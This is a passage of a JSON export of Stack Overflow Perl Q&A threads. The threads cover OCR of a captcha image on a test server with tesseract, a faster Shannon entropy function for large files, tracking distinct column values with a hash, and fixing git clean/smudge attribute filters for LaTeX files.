that's going to do, but it will trash whatever output <code>tesseract</code> has already stored in that file.</p>\n\n<p><strong>Updated Update:</strong></p>\n\n<p>Here's my current version of the code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse feature 'say';\nuse LWP::Simple qw[$ua get getstore];\nuse File::Basename;\n###\nmy $user = 'xxxx'; #Enter your username here\nmy $pass = 'xxxx'; #Enter your password here\n###\n#Server settings\nmy $home = \"http://perltest.adavice.com\";\nmy $url = \"$home/c/test.cgi?u=$user&amp;p=$pass\";\n#Get HTML code!\nmy $html = get($url);\nmy $img;\n###Add code here!\n#Grab img from HTML code\nif ($html =~ m%img[^&gt;]*src=\"(/[^\"]*)\"%s)\n{\n    $img = $1;\n}\nmy $img_url = $home . $img;\nmy $img_file = 'ocr_me.img';\n\ngetstore($img_url, $img_file);\n\nsay $img_url;\nsay $img_file;\n\n# Looks like tesseract adds two newlines to its output -\n# so chomp() it twice!\nchomp(my $txt = `tesseract ocr_me.img stdout`);\nchomp($txt);\n\nsay \"[$txt]\";\n\n$txt =~ s/\\W+//g;\n\nmy $resp = $ua-&gt;post($url, {\n  u    =&gt; $user,\n  p    =&gt; $pass,\n  file =&gt; basename($img),\n  text =&gt; $txt,\n});\n\nprint $resp-&gt;code;\nprint $resp-&gt;content;\n</code></pre>\n\n<p>I've changed a few things.</p>\n\n<ol>\n<li>Corrected <code>$img_url</code> from <code>$url . $img</code> to <code>$home . $img</code> (this is what was stopping it from getting the correct image).</li>\n<li>Switched to using LWP::Simple throughout (it's just easier).</li>\n<li><code>chomp</code>ed (twice!) the output from <code>tesseract</code> to remove newlines.</li>\n<li>Used File::Basename to get the correct filename to pass in the final <code>POST</code>.</li>\n<li>Removed any non-word characters from <code>$txt</code> before <code>POST</code>ing it.</li>\n</ol>\n\n<p>It still doesn't quite work. It seems to hang waiting for a response from the server. But I'm afraid I've run out of time to help you.</p>\n"}], "owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 280, "favorite_count": 0, "accepted_answer_id": 51630558, "answer_count": 1, "score": 0, "last_activity_date": 1533141879, "creation_date": 1533112218, "last_edit_date": 1533141879, "question_id": 51628713, "link": "https://stackoverflow.com/questions/51628713/tesseract-dont-recognize-captcha-in-png-file-which-contains-numbers-and-letters", "title": "Tesseract dont recognize captcha in png file, which contains numbers and letters of the English alphabet", "body": "<p>I need to extract captcha from url and recognised it with Tesseract. My code is:</p>\n\n<pre><code>#!/usr/bin/perl -X\n###\n$user = 'user'; #Enter your username here\n$pass = 'pass'; #Enter your password here\n###\n#Server settings\n$home = \"http://perltest.adavice.com\";\n$url = \"$home/c/test.cgi?u=$user&amp;p=$pass\";\n#Get HTML code!\n$html = `GET \"$url\"`\n###Add code here!\n#Grab img from HTML code\nif ($html =~ m%img[^&gt;]*src=\"(/[^\"]*)\"%s)\n{\n    $img = $1;\n}\n###\ndie \"&lt;img&gt; not found\\n\" if (!$img);\n#Download image to server (save as: ocr_me.img)\nprint \"GET '$home$img' &gt; ocr_me.img\\n\";\nsystem \"GET '$home$img' &gt; ocr_me.img\";\n###Add code here!\n#Run OCR (using shell command tesseract) on img and save text as ocr_result.txt\nsystem(\"tesseract ocr_me.img ocr_result\");\nprint \"GET '$txt' &gt; ocr_result.txt\\n\";\nsystem \"GET '$txt' &gt; ocr_result.txt\";\n###\ndie \"ocr_result.txt not found\\n\" if (!-e \"ocr_result.txt\");\n# check OCR results:\n$txt = 'cat ocr_result.txt';\n$txt =~ s/[^A-Za-z0-9\\-_\\.]+//sg;\n$img =~ s/^.*\\///;\nprint `echo -n \"file=$img&amp;text=$txt\" | POST \"$url\"`;\n</code></pre>\n\n<p>Image parse correctly. This image contain captcha and looks like:</p>\n\n<p><a href=\"https://i.stack.imgur.com/0bjWM.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/0bjWM.png\" alt=\"My image PNG file, which contains a captcha\"></a></p>\n\n<p>My output is:</p>\n\n<pre><code>GET 'http://perltest.adavice.com/captcha/1533110309.png' &gt; ocr_me.img\nTesseract Open Source OCR Engine v3.02.02 with Leptonica\nGET '' &gt; ocr_result.txt\nCaptcha text not specified\n</code></pre>\n\n<p>As you see, script parse image correctly. But Tesseract didnt see anything in that PNG file. I am trying to specify additional parameters such as -psm and -l with shell command tesseract, but this also giving nothing</p>\n\n<p><strong>UPDATE</strong>: After read answer @Dave Cross, I am tried his suggestion.</p>\n\n<p>In output I got:</p>\n\n<pre><code>http://perltest.adavice.com/captcha/1533141024.png\nocr_me.img\nTesseract Open Source OCR Engine v3.02.02 with Leptonica\n[]\n200Captcha text not specified\nOriginal image file not specified\nCaptcha text not specified\n</code></pre>\n\n<p>Why I need text from image .PNG?  Maybe this additional information can help you. \nLook at that:\n<a href=\"https://i.stack.imgur.com/8oECE.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/8oECE.png\" alt=\"enter image description here\"></a></p>\n\n<p>This is how $url looks like in browser. My goal here is create query for this page in wim using perl. For this I need fill in forms above my $user, $pass and $txt (from recognized with Tesseract image). And send that with POST 'url' (last string in code).</p>\n"}, {"tags": ["perl", "math", "entropy"], "comments": [{"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1533098993, "post_id": 51624871, "comment_id": 90215707, "body": "Try using <code>read_binary()</code> from <a href=\"https://metacpan.org/pod/File::Slurper\" rel=\"nofollow noreferrer\">File::Slurper</a> to read the file."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1533099207, "post_id": 51624871, "comment_id": 90215753, "body": "Failing that, it&#39;s possible this entropy function is just really slow."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1533099635, "post_id": 51624871, "comment_id": 90215862, "body": "Looking at the <a href=\"https://metacpan.org/source/LNATION/Shannon-Entropy-1.000000/lib/Shannon/Entropy.pm\" rel=\"nofollow noreferrer\">source</a>, yup, it&#39;s going to be really slow as it splits its argument into a list of characters - so 32678 elements, which it then maps to create a new 32678 element list which is mapped to... You can probably get orders of magnitude of speed improvement by rewriting it to avoid all those lists."}, {"owner": {"reputation": 63, "user_id": 10163450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jg3Eg.jpg?s=128&g=1", "display_name": "BwE", "link": "https://stackoverflow.com/users/10163450/bwe"}, "reply_to_user": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1533100079, "post_id": 51624871, "comment_id": 90215981, "body": "I suppose I could give it a shot, it&#39;s a shame I have to use Shanon entropy. The above is the only one on CPAN. Thank you :)"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1533100338, "post_id": 51624871, "comment_id": 90216067, "body": "(Er, 32678 * 1024 elements)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533117722, "post_id": 51624871, "comment_id": 90225153, "body": "Are you sure you don&#39;t mean 32,768 (2**15)?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533121210, "post_id": 51624871, "comment_id": 90227315, "body": "<i>&quot;This yields an almost infinite wait time&quot;</i> You would have to wait a very long time to test that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1533631036, "post_id": 51624871, "comment_id": 90405085, "body": "Please see <a href=\"http://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>  If things still aren&#39;t right provide feedback."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1533117978, "post_id": 51628560, "comment_id": 90225319, "body": "<code>open my $fh, &#39;&lt;:raw&#39;, $file_name or die qq{Cant open &quot;$file_name&quot; for input: $!}</code> is better. There is also no need for <code>binmode</code> afterwards."}, {"owner": {"reputation": 63, "user_id": 10163450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jg3Eg.jpg?s=128&g=1", "display_name": "BwE", "link": "https://stackoverflow.com/users/10163450/bwe"}, "edited": false, "score": 0, "creation_date": 1541307912, "post_id": 51628560, "comment_id": 93168477, "body": "What you first wrote is great, I am able to calculate a 32mb file in about 10-15 seconds, depending on the computer. Is there a quicker way? I would love to be able to calculate the entropy of multiple files in quick succession!"}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1541492640, "post_id": 51628560, "comment_id": 93226102, "body": "I sent the new code to the module maintainer (<a href=\"https://rt.cpan.org/Public/Bug/Display.html?id=127573\" rel=\"nofollow noreferrer\">rt.cpan.org/Public/Bug/Display.html?id=127573</a>)"}], "tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": true, "score": 3, "last_activity_date": 1533114229, "last_edit_date": 1533114229, "creation_date": 1533111733, "answer_id": 51628560, "question_id": 51624871, "link": "https://stackoverflow.com/questions/51624871/calculating-the-entropy-of-a-32mb-file-in-perl-what-is-the-quickest-method/51628560#51628560", "title": "Calculating the entropy of a 32mb file in Perl - What is the quickest method?", "body": "<p>Here is the entropy function re written to avoid all the map calls</p>\n\n<pre><code>sub entropy {\n    my ($entropy, $len, $p, %t) = (0, length($_[0]));\n    my @chars = split '', $_[0];\n    $t{$_}++ foreach @chars;\n\n    foreach (values %t) {\n        $p = $_/$len;\n        $entropy -= $p * log $p ;\n    }       \n\n    return $entropy / log 2;\n}\n</code></pre>\n\n<p>It may work out faster for you</p>\n\n<p>I've had second thoughts about this. You don't actually need to slurp the file into memory. <code>$len</code> is the length of the file which can be got from <code>-s $file_name</code> and <code>%t</code> is the frequency table which can be calculated by reading in a block at a time. So a version of the function to calculate the entropy of a file would be</p>\n\n<pre><code>sub file_entropy {\n    my ($file_name) = @_;\n\n    # Get number of bytes in file\n    my $len = -s $file_name;\n    my ($entropy, %t) = 0;\n\n    open (my $file, '&lt;', $file_name) || die \"Cant open $file_name\\n\";\n    binmode $file;\n\n    # Read in file 1024 bytes at a time to create frequancy table\n    while( read( $file, my $buffer, 1024) ) {\n        $t{$_}++ \n            foreach split '', $buffer;\n\n        $buffer = '';\n    }\n\n    foreach (values %t) {\n        my $p = $_/$len;\n        $entropy -= $p * log $p ;\n    }       \n\n    return $entropy / log 2;\n}\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 10163450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jg3Eg.jpg?s=128&g=1", "display_name": "BwE", "link": "https://stackoverflow.com/users/10163450/bwe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 1, "accepted_answer_id": 51628560, "answer_count": 1, "score": 0, "last_activity_date": 1533114229, "creation_date": 1533093300, "question_id": 51624871, "link": "https://stackoverflow.com/questions/51624871/calculating-the-entropy-of-a-32mb-file-in-perl-what-is-the-quickest-method", "title": "Calculating the entropy of a 32mb file in Perl - What is the quickest method?", "body": "<p>I have a 32,678kb encrypted bin file which I need the entropy of. I am using Perl as its part of a larger project.</p>\n\n<p>I have so far used the following 'technique':</p>\n\n<pre><code>use Shannon::Entropy qw/entropy/;\nmy $file = \"test.bin\";\nopen(my $bin, \"&lt;\", $file) or die $!; binmode $bin;\nseek($bin, 0x000000, 0); \nread($bin, my $entropy, 0x01FFFFF0);\nprint entropy($entropy);\n</code></pre>\n\n<p>This yields an almost infinite wait time, to the point where I give up after 30+ minutes.</p>\n\n<p>I cannot deviate from testing the entire file's entropy.</p>\n\n<p>Is there any quicker way? Would splitting it, entropy-ing it and using some weird math to combine again result in the same entropy as if it were one file?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 103, "user_id": 10077590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bbf1f42ef939cb00e138d4df481816e2?s=128&d=identicon&r=PG&f=1", "display_name": "FoxElemental", "link": "https://stackoverflow.com/users/10077590/foxelemental"}, "edited": false, "score": 1, "creation_date": 1533080118, "post_id": 51623445, "comment_id": 90212074, "body": "Welcome to Stack Overflow, Cori! If you have a moment, please visit our <a href=\"https://stackoverflow.com/help\">help center</a> and visit the <a href=\"https://stackoverflow.com/tour\">tour</a>."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10145506, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ga6ghXkySY0/AAAAAAAAAAI/AAAAAAAAGGU/Fyq3yJjbM6s/photo.jpg?sz=128", "display_name": "Cori Grainger", "link": "https://stackoverflow.com/users/10145506/cori-grainger"}, "edited": false, "score": 0, "creation_date": 1533155014, "post_id": 51623772, "comment_id": 90247823, "body": "With your suggestions an some playing around, I&#39;ve gotten it to work. Thanks for your help!"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 11, "user_id": 10145506, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ga6ghXkySY0/AAAAAAAAAAI/AAAAAAAAGGU/Fyq3yJjbM6s/photo.jpg?sz=128", "display_name": "Cori Grainger", "link": "https://stackoverflow.com/users/10145506/cori-grainger"}, "edited": false, "score": 0, "creation_date": 1533170096, "post_id": 51623772, "comment_id": 90252158, "body": "@CoriGrainger  Great :)  If any questions come up please let me know."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 0, "last_activity_date": 1536252377, "last_edit_date": 1536252377, "creation_date": 1533083206, "answer_id": 51623772, "question_id": 51623445, "link": "https://stackoverflow.com/questions/51623445/perl-trying-to-see-if-the-nth-column-of-line-x-matches-the-nth-column-of-line-x/51623772#51623772", "title": "Perl: Trying to see if the Nth column of line X matches the Nth column of line X-1", "body": "<p>Use a hash to store, and thus be able to check for, the distinct values in the first column.</p>\n\n<p>I assume that <code>color_gen()</code> returns a new random color at each invocation. The desired output is unclear to me so it is only indicated in the code.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = shift @ARGV;\ndie \"Usage: $0 filename\\n\" if not $file or not -f $file;\n\nopen my $fh, '&lt;', $file or die \"Can't open $file: $!\";\n\nmy %c0;\n\nwhile (&lt;$fh&gt;) {\n    next if /^(?:\\s*$|\\s*#)/;  # skip: spaces only or empty, comment\n    my @cols = split;\n\n    my ($num) = $cols[0] =~ /^([0-9]+)/;\n\n    if (not exists $c0{$num}) {  # this number not seen yet; assign color\n        $c0{$num} = color_gen();\n    }\n\n    # write line of output, with $c0{$num} and @cols\n}\n</code></pre>\n\n<p>The value \"<em>before the decimal point in column 0</em>\" is extracted using regex as the leading number in that string and stored in <code>$num</code>. The parens around are needed to provide the list context for the match operator, in which case it returns the captured values. See <a href=\"https://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">perlretut</a>.</p>\n\n<p>This number is stored as a key in a hash with its value being the generated color. Unless it already exists that is, in which case it has been seen and a color for it generated. This way you can keep track of distinct numbers in that column. Then you can write output using <code>$c0{$num}</code>.</p>\n\n<p>This can be written far more compactly but I hoped for clarity.</p>\n\n<p>The skipped lines here aren't those \"<em>beginning with comments and spaces</em>\" but are ones with only spaces (or empty), or comments. If you really mean to skip lines that merely start with whitespace (or <code>#</code>) then indeed use <code>/^(?:\\s|#)/</code>, where <code>?:</code> makes <code>()</code> only group and not capture.</p>\n\n<p>A few comments on the code</p>\n\n<ul>\n<li><p>Always have <code>use warnings;</code> and <code>use strict;</code> at the beginning of each program</p></li>\n<li><p>The <code>\\s</code> in regex matches most types of whitespace; no need for a separate pattern for tab</p></li>\n<li><p>A variable can be declared right in the <code>while</code> condition, which makes it perfectly scoped -- to that loop. However, you can also omit it and use <code>$_</code></p></li>\n<li><p>If <code>while</code> condition has only the input read, such as <code>&lt;$fh&gt;</code>, then the value is assigned to <a href=\"https://perldoc.perl.org/perlvar.html#$_\" rel=\"nofollow noreferrer\"><code>$_</code> variable</a>; also see <a href=\"https://perldoc.perl.org/perlop.html#I/O-Operators\" rel=\"nofollow noreferrer\">I/O in perlop</a>.\nI use that here since then the regex is simpler (match on <code>$_</code> by default) and so is <code>split</code></p></li>\n<li><p>The <a href=\"https://perldoc.perl.org/functions/split.html\" rel=\"nofollow noreferrer\">split</a> without arguments has default of <code>split ' ', $_;</code>, where <code>' '</code> stands for any amount of any whitespace (and leading spaces are removed before splitting)</p></li>\n</ul>\n\n<p>Please provide exact samples of input and desired output for a more complete example.</p>\n"}], "owner": {"reputation": 11, "user_id": 10145506, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ga6ghXkySY0/AAAAAAAAAAI/AAAAAAAAGGU/Fyq3yJjbM6s/photo.jpg?sz=128", "display_name": "Cori Grainger", "link": "https://stackoverflow.com/users/10145506/cori-grainger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1536252377, "creation_date": 1533079862, "question_id": 51623445, "link": "https://stackoverflow.com/questions/51623445/perl-trying-to-see-if-the-nth-column-of-line-x-matches-the-nth-column-of-line-x", "title": "Perl: Trying to see if the Nth column of line X matches the Nth column of line X-1", "body": "<p>I have a perl script that reads text file line by line and splits the line into 4 different columns (shown by dashes &amp; referred to as $cols[0-3] in code; important parts are bolded). For each distinct value <em>before</em> the decimal point in column 0, it should randomly generate a hex color.</p>\n\n<p>Essentially, I need to compare if the Xth column in the current line matches that of the previous line.</p>\n\n<p>A----last_column----221----18</p>\n\n<p>A----last_column----221----76 </p>\n\n<p>A----last_column----221----42</p>\n\n<p>B----last_column----335----18  </p>\n\n<p>C----last_column----467----83</p>\n\n<p>So far, I am randomly generating a new #random_hex_color for every line, but desired output is below:</p>\n\n<p><strong>221</strong>.18-------<strong>#EB23AE1</strong>-------<strong>@$some/random/path/A.txt</strong>-------last_column</p>\n\n<p><strong>221</strong>.76-------<strong>#EB23AE1</strong>-------<strong>@$some/random/path/A.txt</strong>-------last_column</p>\n\n<p><strong>221</strong>.42-------<strong>#EB23AE1</strong>-------<strong>@$some/random/path/A.txt</strong>-------last_column</p>\n\n<p><strong>335</strong>.18-------<strong>#AC16D6E</strong>-------<strong>@$some/random/path/B.txt</strong>-------last_column</p>\n\n<p><strong>467</strong>.83-------<strong>#FD89A1C</strong>-------<strong>@$some/random/path/C.txt</strong>-------last_column</p>\n\n<p>[Image of input file and desired output][1]</p>\n\n<pre><code>my @cols;\nmy $row;\nmy $color = color_gen();\nmy $path = \"\\t@\\some_random_path/\"; \nmy $newvar = dir_contents();\nmy @array = ($color, $path, $newvar);\nmy %hash;\n\nwhile ($row = &lt;$fh&gt;){\n    next if $row =~ /^(#|\\s|\\t)/; #skip lines beginning with comments and spaces\n    @cols = split(\" \", $row);\n    %hash = (\n        \"$cols[2]\" =&gt; [\"$color\", \"$path\", \"$newvar\"]\n         );\n    say Dumper (\\%hash);\n    print(\"$cols[2].$cols[3]\\t#\");\n    print(color_gen());\n    printf(\"%-65s\", $path.dir_contents());\n    print(\"\\t\\t$cols[0]_\".\"$cols[1]\".\" 1 1\\n\");\n}\n</code></pre>\n"}, {"tags": ["git", "perl"], "comments": [{"owner": {"reputation": 55797, "user_id": 7976758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/512cfbaf98d63ca4acd57b2df792aec6?s=128&d=identicon&r=PG", "display_name": "phd", "link": "https://stackoverflow.com/users/7976758/phd"}, "edited": false, "score": 1, "creation_date": 1533079579, "post_id": 51623143, "comment_id": 90211956, "body": "<code>*.tex filter=wordbyword</code> (<b>k</b> =&gt; <b>d</b>)."}, {"owner": {"reputation": 420, "user_id": 4843013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51191a7be00f2c3ef7cb4cba30bebe50?s=128&d=identicon&r=PG&f=1", "display_name": "Nero gris", "link": "https://stackoverflow.com/users/4843013/nero-gris"}, "reply_to_user": {"reputation": 55797, "user_id": 7976758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/512cfbaf98d63ca4acd57b2df792aec6?s=128&d=identicon&r=PG", "display_name": "phd", "link": "https://stackoverflow.com/users/7976758/phd"}, "edited": false, "score": 0, "creation_date": 1533081019, "post_id": 51623143, "comment_id": 90212245, "body": "I&#39;m assuming that is a terse explaination of what I need to do, but I&#39;m not sure I understand what you mean by &quot;(k=&gt;d)&quot;."}, {"owner": {"reputation": 420, "user_id": 4843013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51191a7be00f2c3ef7cb4cba30bebe50?s=128&d=identicon&r=PG&f=1", "display_name": "Nero gris", "link": "https://stackoverflow.com/users/4843013/nero-gris"}, "reply_to_user": {"reputation": 55797, "user_id": 7976758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/512cfbaf98d63ca4acd57b2df792aec6?s=128&d=identicon&r=PG", "display_name": "phd", "link": "https://stackoverflow.com/users/7976758/phd"}, "edited": false, "score": 0, "creation_date": 1533081870, "post_id": 51623143, "comment_id": 90212395, "body": "Oh! I see. A typo. I&#39;ll fix that and see if it works. I&#39;ll also check the other one (the one I actually want) for that sort of thing too. Thanks. That did not fix the problem. It is still doing nothing."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533106661, "post_id": 51623784, "comment_id": 90218608, "body": "Thanks for letting us know"}], "tags": [], "owner": {"reputation": 420, "user_id": 4843013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51191a7be00f2c3ef7cb4cba30bebe50?s=128&d=identicon&r=PG&f=1", "display_name": "Nero gris", "link": "https://stackoverflow.com/users/4843013/nero-gris"}, "is_accepted": true, "score": 2, "last_activity_date": 1533083280, "creation_date": 1533083280, "answer_id": 51623784, "question_id": 51623143, "link": "https://stackoverflow.com/questions/51623143/unable-to-apply-git-attribute-filter/51623784#51623784", "title": "Unable to apply git attribute filter", "body": "<p>I feel quite silly. It was pointed out that there was a spelling mistake. In the process of correcting this mistake I came to see that I had forgotten about the global attributes file at /home/nero/.config/.git/attributes.</p>\n\n<p>Both items are working as expected now.</p>\n\n<p>To be clear, the issue was too many configuration files saying the same thing was confusing Git.</p>\n"}], "owner": {"reputation": 420, "user_id": 4843013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51191a7be00f2c3ef7cb4cba30bebe50?s=128&d=identicon&r=PG&f=1", "display_name": "Nero gris", "link": "https://stackoverflow.com/users/4843013/nero-gris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 169, "favorite_count": 0, "accepted_answer_id": 51623784, "answer_count": 1, "score": 2, "last_activity_date": 1533083280, "creation_date": 1533077297, "last_edit_date": 1592644375, "question_id": 51623143, "link": "https://stackoverflow.com/questions/51623143/unable-to-apply-git-attribute-filter", "title": "Unable to apply git attribute filter", "body": "<h1>Problem</h1>\n<p>I am trying to apply the solution seen in <a href=\"https://stackoverflow.com/a/7781031/4843013\">this SO answer</a>. I have also tried to get <a href=\"https://stackoverflow.com/a/5588565/4843013\">this solution to the same question</a> to work, but I've been unsuccessful in both cases. Both of these use clean/smudge attribute filters.</p>\n<p>The goal is to improve Git's ability to process the files it is to be handling (LaTeX).</p>\n<h1>What I've done</h1>\n<p>The short answer &quot;what have you done&quot; is &quot;what the solutions said to do,&quot; however in case I've over looked something I'll go into detail.</p>\n<p>One potential problem I've looked into is the possiblity that the answers are outdated. From looking at <a href=\"https://git-scm.com/docs/gitattributes\" rel=\"nofollow noreferrer\">Git Attributes Documentation</a> the only thing I can think that might be out-dated is the location for the configuration file. For this reason I have both a <code>.gitattributes</code> file in the repo's root as well as a <code>.git/info/attributes</code> file. I have also tried with only one of these.</p>\n<h3><a href=\"https://stackoverflow.com/a/5588565/4843013\">Word-by-word</a></h3>\n<p>While not the solution I hope to get working, I figured I should try more than one in hopes of better identifying what is going wrong. I choose to go over this one, since I can at least get the script to work outside of Git.</p>\n<p>In my config file I have</p>\n<pre><code> [filter &quot;wordbyword&quot;]\n    clean = /home/nero/myScripts/wordbyword.clean\n    smudge = /home/nero/myScripts/wordbyword.smudge\n</code></pre>\n<p>I copy and paste the above locations into terminal with <code>vim</code> in front (so you know that I didn't make a typo there) and paste the contents below. First <code>clean</code> then <code>smudge</code> though for the latter to be of use, the former must work. . .which is the problem.</p>\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nwhile (&lt;&gt;)\n{\n    print &quot;$_\\n&quot; foreach (m/(.*?\\s+)/go);\n    print '#@#DELIM#@#' . &quot;\\n&quot;;\n}\n</code></pre>\n<p>and</p>\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nwhile (&lt;&gt;)\n{\n    chomp; '#@#DELIM#@#' eq $_ and print &quot;\\n&quot; or print;\n}\n</code></pre>\n<p>The attributes file is simply <code>*.tex filter=wordbyword</code></p>\n<p>However when I run <code>git show HEAD:file.tex</code> it shows that it is being stored normally.</p>\n<p>I know that the script works. When I run <code>perl wordbyword.clean test.tex</code> the output is as expected.</p>\n<p>After poking around, I saw that I in fact DID have two files telling Git what needs to be done with .tex files. I had put one in a global location. Oops. This one works now. . .and the next one as well. At least for the cleaning. I'm going to check out smudging now before I answer my own question.</p>\n<h3><a href=\"https://stackoverflow.com/a/7781031/4843013\">Sentence by Sentance</a>.</h3>\n<p>This is the one I prefer. To me it seems most reasonable to store a file in logical units. A paragraph is a logical unit, but its too large to be handled effective. A sentence is the next size of logical unit, and is about right.</p>\n<p>This is actually the simpler one, since instead of a script, it is a simple one-line perl substitution.</p>\n<pre><code>[filter &quot;sentencebreak&quot;]\n    clean = perl -pe \\&quot;s/[.]*?(\\\\?|\\\\!|\\\\.|'') /$&amp;%NL%\\\\n/g unless m/%/||m/^[\\\\ *\\\\\\\\\\\\]/\\&quot;\n    smudge = perl -pe \\&quot;s/%NL%\\\\n//gm\\&quot;\n</code></pre>\n<p>with the attributes <code>*.tex filter=sentencebreak</code></p>\n<p>However, when I run the substitution with <code>perl -pe &quot;that long line&quot; &lt; test.tex</code> instead of printing newlines at every period, it prints <code>\\n</code> at every white space (and leaves periods alone). I identified <code>\\\\n</code> which appears to be escaping the newline. Changing that to <code>\\n</code> causes it to produce newlines, however it is still breaking at white space, which is not what I desire.</p>\n<p>Looking closer at that perl substitution (I'm bad at perl) I see that its escaping the punctuation. Removing the extra <code>\\</code> &quot;mixed&quot; that part of it.</p>\n"}, {"tags": ["perl", "ssl", "iis", "cgi"], "comments": [{"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "edited": false, "score": 1, "creation_date": 